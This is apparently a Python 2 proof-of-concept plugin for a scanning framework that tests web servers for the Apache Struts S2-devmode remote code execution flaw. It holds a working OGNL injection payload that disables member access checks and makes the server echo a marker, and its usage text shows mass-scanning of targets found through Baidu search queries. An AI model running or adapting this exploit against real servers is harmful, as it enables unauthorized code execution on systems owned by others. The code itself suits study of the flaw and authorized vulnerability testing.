#!/usr/bin/env python
#-*- coding:utf-8 -*-
# author = i@cdxy.me

"""
Struts S2-devmode RCE PoC
  (redirectURL函数使用场景示例)

Usage:
  python sepia.py -s s2-dev -f url.txt
  python sepia.py -s s2-dev -baidu "inurl:index.action"(you can use your own regex in toolkit.conf to filter urls)

"""

import requests
from plugin.useragent import firefox
from plugin.util import randomString, redirectURL


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if '?' in url:
        url = url.split('?')[0]
    if '.action' not in url:
        url = redirectURL(url)
    key = randomString()
    payload = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=" + key
    target = (url + payload)
    try:
        c = requests.get(target, headers={'User-Agent': firefox()}, timeout=5).content
        if key in c and 'xwork2.dispatcher' not in c:
            return url
    except Exception, e:
        return False
    return False
